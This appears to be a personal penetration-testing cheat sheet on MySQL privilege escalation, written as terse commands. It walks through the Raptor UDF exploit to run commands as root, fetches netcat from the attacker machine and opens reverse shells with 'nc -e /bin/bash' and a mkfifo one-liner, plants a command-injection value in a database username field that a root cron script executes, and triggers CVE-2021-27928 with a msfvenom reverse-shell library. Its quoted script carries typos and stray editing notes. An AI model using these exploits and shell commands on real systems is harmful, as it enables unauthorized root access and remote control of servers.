#### Enumeration

```bash - kali
ps aux | grep mysql
```

Is mysql running as root?
```bash - kali
ps aux | grep root | grep mysql
```

If so, folllow [[MySQL#Raptor User Defined Function]]

![[Grep#Grep'n for passwords]]

![[find#Hunting for config files]]

#### Raptor User Defined Function

![[14._MySQL Raptor Service Exploits]]


---

DELETE OR KEEP THE FOLLOWING?

```sql - target
insert into foo values(load_file('/var/www/raptor_udf2.so'));
```


If everything went according to plan, the `do_system` function based on our malicious UDF will grant us root-level command execution. To check this, we can run the `id` command and redirect the output to a file we can read:

```sql - target
select do_system('id > /var/www/out; chown www-data.www-data /var/www/out');
```

```sql - target
\! sh
```

```sql - target
cat /var/www/out
```

`uid=0(root) gid=114(mysql) groups=114(mysql)`

```sql - target
exit
```

The command did indeed execute with the highest privileges. To obtain a reverse shell, we can download our copy of the Netcat binary to the target and then run it as root. We'll continue utilizing our running python web server on port 8295.

On Kali:

```bash - kali
which nc
```

```bash - kali
cp /usr/bin/nc .
```

![[Python#Server]]

```sql - target
select do_system('wget http://$KALI:80/nc -O /var/www/nc');
```


```sql - target
select do_system('chmod 777 /var/www/nc');
```

![[1._rlwrap]]

```sql - target
select do_system('/var/www/nc $KALI 443 -e /bin/bash');
```

---

#### Reverse shell DB injection

`CMD: UID=0 PID=168931 | /bin/sh -c /bin/sh -c /opt/check_mailpass_expiration.sh`

```
cat /opt/check_mailpass_expiration.sh
```

```
#1/bin/bash
#Adapt to your setup 

POSTFIX_DB="post fixadmin" 
MYSQL_CREDENTIALS_FILE="/root/postfixadmin.my.cnf" 

REPLY_ADDRESS=noreplyaspaghetti.lan 

# Change this list to change notification times and when ... 
for INTERVAL in 30 14 7 
do 
	LOWER=$(( SINTERVAL - 1)) 
	QUERY="SELECT username,password_expiry FROM mailbox WHERE password_expiry > now() + interval $LOWER DAY AND password_expiry < NOW() + interval $INTERVAL DAY’ 
	mysql --defaults-extra-file="$MySQL_CREDENTIALS_FILE" "$POSTFIX_DB" -B -e "$QUERY" | while read -a RESULT ; do 
		echo -e "Dear User, \n Your password will expire on ${RESULT[1]}" | mail -s "Password 30 days before expiration notication® -r $REPLY_ADDRESS ${RESULT[0]} 
	done 
done
```

First, create the reverse shell file.
```bash - target
cat > script.sh <<EOF
```

```bash - target
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 80 >/tmp/f
```

```bash - target
EOF
```

Make it executable.
```bash - target
chmod +x script.sh
```

Log in to mysql.
```bash - target
mysql -u <USERNAME> -p<PASSWORD>
```

```sql - target
show databases;
```

```sql - target
use <DATABASE>;
```

```sql - target
show tables;
```

```sql - target
describe <TABLE>;
```

`username`
`....`
`password_expiry`
`...`

```sql - target
select username, password_expiry from <TABLE>;
```

```sql - target
update <TABLE> set username=' |/tmp/Tools/script.sh';
```

```sql - target
update <TABLE> set password_expiry = (select now() + interval 7 day);
```

```sql - target
select username, password_expiry from <TABLE>;
```


`| /tmp, ipt.sh | 2022-03-31 15:41:17 |`


#### CVE-2021-27928

MySQL version 10.3.25

https://github.com/Al1ex/CVE-2021-27928

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f elf-so -o reverse.so
```

Copy the file to the target machine. Now stand up a listener on port 443 and issue the following command in the MySQL console to trigger the shell.

[[Python#Server]]

[[1._rlwrap]]

```mysql - target
SET GLOBAL wsrep_provider="/tmp/reverse.so";
```

